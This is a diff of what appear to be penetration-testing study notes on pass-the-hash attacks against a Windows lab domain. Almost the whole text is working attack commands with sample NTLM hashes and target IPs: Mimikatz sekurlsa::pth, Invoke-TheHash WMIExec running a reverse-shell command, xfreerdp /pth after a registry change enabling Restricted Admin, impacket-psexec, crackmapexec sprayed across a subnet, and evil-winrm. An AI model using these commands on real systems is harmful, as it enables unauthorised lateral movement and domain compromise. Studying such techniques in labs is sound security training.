@@ -1,6 +1,6 @@
 We can pass the hash of the password if we are not able to crack it or just pass the hash.
 
-Option 1) We can use "Mimikatz" for this 
+Option 1) We can use "Mimikatz" for this :- Below command will open new CMD window with that user 
         # c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
         # c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<HASH> /domain:<Domain> /run:cmd.exe" exit
 
@@ -17,22 +17,24 @@ Step 1) PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
 Step 2) PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target <IP Address of DC> -Domain <Domain> -Username <Username> -Hash <HASH> -Command "<Revers shell Powershell command>"
         We can generate the PowerShell command from URL "https://www.revshells.com/" 
 
+Option 3) We can PTH from Linux to DC. Only if , c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f is disabled and run the below command 
+        # xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
-===========================================================================================================================================================================================================================
+Below option are for Linux 
 
-Now let's see what we can do from Linux device 
-
-Option 1) Impacket can be used for PTH attack 
+Option 4) Impacket can be used for PTH attack 
         # umarkhan$ impacket-psexec <Username>@<IP address> -hashes :<HASH>
         # umarkhan$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
-Option 2) CrackMapExec can be used for the same
+Option 5) CrackMapExec can be used for the same
         # umarkhan# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
         # umarkhan# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453  --local-auth
                          --local-auth :- If the hash is the hash of the local syatem admin not AD admin
 
-Option 3) evil-winrm for the PTH 
+Option 6) evil-winrm for the PTH 
         # umarkhan$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
-Option 4) We can PTH from Linux to DC. Only if , c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f is disabled 
+
+
+
 
